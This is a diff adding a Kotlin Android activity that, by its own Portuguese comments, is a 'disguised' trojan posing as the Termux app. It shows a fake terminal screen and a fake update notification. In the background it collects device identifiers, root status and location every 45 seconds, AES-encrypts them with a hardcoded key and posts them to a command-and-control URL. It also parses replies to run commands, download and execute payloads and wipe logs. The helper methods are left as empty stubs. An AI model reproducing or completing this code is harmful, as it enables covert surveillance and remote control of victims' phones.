@@ -1,0 +1,183 @@
+// MainActivity.kt - Versão disfarçada
+package com.termux.app
+
+import android.Manifest
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
+import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.graphics.BitmapFactory
+import android.os.Build
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.telephony.TelephonyManager
+import android.widget.TextView
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
+import androidx.core.app.NotificationManagerCompat
+import com.google.gson.Gson
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.File
+import java.io.IOException
+import java.util.*
+import javax.crypto.Cipher
+import javax.crypto.spec.IvParameterSpec
+import javax.crypto.spec.SecretKeySpec
+
+class MainActivity : AppCompatActivity() {
+
+    // Configurações disfarçadas
+    private val C2_SERVER = "https://api.termux-update[.]com/v2" // Domínio falso
+    private val INTERVAL = 45000 // 45 segundos
+    private val CHANNEL_ID = "termux_notifications"
+    private val NOTIFICATION_ID = 101
+    private val AES_KEY = "29f9d2ds9v2ds9v2".toByteArray() // Chave AES-128
+    private val handler = Handler(Looper.getMainLooper())
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        // Interface legítima
+        findViewById<TextView>(R.id.terminal_view).text = "Termux v3.2.1\n$ "
+
+        // Cria canal de notificação falso
+        createNotificationChannel()
+
+        // Verifica atualizações (falso)
+        showUpdateNotification()
+
+        // Inicia serviço em segundo plano
+        handler.postDelayed(backgroundTask, 10000)
+    }
+
+    private val backgroundTask = object : Runnable {
+        override fun run() {
+            try {
+                // 1. Coleta informações
+                val deviceInfo = getDeviceInfo()
+
+                // 2. Criptografa dados
+                val encryptedData = encryptData(Gson().toJson(deviceInfo))
+
+                // 3. Envia para C2
+                sendToC2(encryptedData)
+
+                // 4. Verifica comandos
+                checkForCommands()
+
+            } catch (e: Exception) {
+                // Falha silenciosa
+            } finally {
+                handler.postDelayed(this, INTERVAL.toLong())
+            }
+        }
+    }
+
+    private fun getDeviceInfo(): Map<String, String> {
+        return mapOf(
+            "device_id" to getAndroidId(),
+            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
+            "os" to "Android ${Build.VERSION.RELEASE}",
+            "root" to checkRoot().toString(),
+            "location" to getLastLocation(),
+            "time" to System.currentTimeMillis().toString()
+        )
+    }
+
+    private fun encryptData(data: String): String {
+        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
+        val keySpec = SecretKeySpec(AES_KEY, "AES")
+        val iv = ByteArray(16) // IV fixo para exemplo
+        cipher.init(Cipher.ENCRYPT_MODE, keySpec, IvParameterSpec(iv))
+        return Base64.getEncoder().encodeToString(cipher.doFinal(data.toByteArray()))
+    }
+
+    private fun sendToC2(data: String) {
+        Thread {
+            try {
+                val client = OkHttpClient.Builder()
+                    .connectTimeout(15, TimeUnit.SECONDS)
+                    .build()
+
+                val request = Request.Builder()
+                    .url("$C2_SERVER/updates")
+                    .post(data.toRequestBody("text/plain".toMediaType()))
+                    .header("User-Agent", "Termux-Update/3.2.1")
+                    .build()
+
+                client.newCall(request).execute().use { response ->
+                    if (response.isSuccessful) {
+                        parseC2Response(response.body?.string())
+                    }
+                }
+            } catch (e: IOException) {
+                // Erro silencioso
+            }
+        }.start()
+    }
+
+    private fun parseC2Response(response: String?) {
+        response?.let {
+            try {
+                val json = JSONObject(it)
+                when (json.optString("action")) {
+                    "cmd" -> executeCommand(json.getString("command"))
+                    "upload" -> downloadAndExecute(json.getString("url"))
+                    "clean" -> clearLogs()
+                }
+            } catch (e: Exception) {
+                // Ignora erros de parsing
+            }
+        }
+    }
+
+    private fun showUpdateNotification() {
+        val intent = Intent(this, MainActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+        }
+        val pendingIntent = PendingIntent.getActivity(
+            this, 0, intent, PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setSmallIcon(R.drawable.ic_termux)
+            .setLargeIcon(BitmapFactory.decodeResource(resources, R.drawable.ic_termux))
+            .setContentTitle("Termux Update")
+            .setContentText("Downloading package updates...")
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+            .setContentIntent(pendingIntent)
+            .build()
+
+        NotificationManagerCompat.from(this).notify(NOTIFICATION_ID, notification)
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Termux Updates",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Package update notifications"
+            }
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.createNotificationChannel(channel)
+        }
+    }
+
+    // Métodos auxiliares ocultos
+    private fun getAndroidId(): String = "unknown"
+    private fun checkRoot(): Boolean = false
+    private fun getLastLocation(): String = "unknown"
+    private fun executeCommand(cmd: String) {}
+    private fun downloadAndExecute(url: String) {}
+    private fun clearLogs() {}
+}
